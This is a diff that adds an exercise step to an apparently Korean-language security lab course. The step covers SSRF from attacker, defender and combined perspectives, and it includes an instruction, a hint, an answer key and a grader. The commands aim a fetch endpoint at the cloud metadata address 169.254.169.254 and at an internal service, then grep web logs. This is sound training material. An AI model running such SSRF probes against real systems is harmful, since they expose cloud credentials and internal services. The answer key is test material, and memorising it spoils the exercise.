@@ -125,3 +125,41 @@ steps:
         success_criteria: [3 영역]
         acceptable_methods: ["**[관리적] PTES + CWE-918**"]
     target_vm: bastion
+
+  # ============================================================
+  # STEP 5 — R/B/P 종합 (SSRF)
+  # ============================================================
+  - order: 5
+    instruction: |
+      ## 🎯 MISSION (R/B/P 종합)
+
+      Red = SSRF 의 4 시도 (cloud metadata 시뮬 + internal scan + DNS rebind 가설 +
+      redirect) / Blue = whitelist URL + schema/port 제한 / Purple = IMDSv2 + IAM
+      최소 권한.
+
+      ## 💻 실행
+      ```bash
+      ssh 6v6-attacker 'curl -s -o /dev/null -w "metadata %{http_code}\n" -H "Host: api.6v6.lab" "http://10.20.30.1/api/fetch?url=http://169.254.169.254/latest/meta-data/"'
+      ssh 6v6-attacker 'curl -s -o /dev/null -w "internal %{http_code}\n" -H "Host: api.6v6.lab" "http://10.20.30.1/api/fetch?url=http://10.20.30.201:8003/health"'
+      ssh 6v6-web "sudo tail -10 /var/log/apache2/access.log 2>/dev/null | grep -i 'fetch' | head -3"
+      echo "Coverage: whitelist + schema 제한 + IMDSv2 + IAM 최소권한 의 4 layer"
+      ```
+
+      ## 💡 왜
+      SSRF 의 4 시도 의 detection + cloud metadata 보호 의 routine.
+    hint: 'curl 의 fetch endpoint + access.log grep'
+    category: rbp_integration
+    points: 4
+    answer: |
+      ssh 6v6-attacker 'curl -s -o /dev/null -w "metadata %{http_code}\n" -H "Host: api.6v6.lab" "http://10.20.30.1/api/fetch?url=http://169.254.169.254/latest/meta-data/" 2>&1 || echo "endpoint 없음"'
+      echo "Coverage: whitelist + schema + IMDSv2 + IAM"
+    answer_detail: SSRF R/B/P 1 cycle
+    verify:
+      type: output_contains
+      expect: 'Coverage'
+      field: stdout
+      semantic:
+        intent: SSRF 의 R/B/P
+        success_criteria: [metadata 시도, Coverage]
+        acceptable_methods: ["**[OSS] curl 의 fetch URL**"]
+    target_vm: attacker
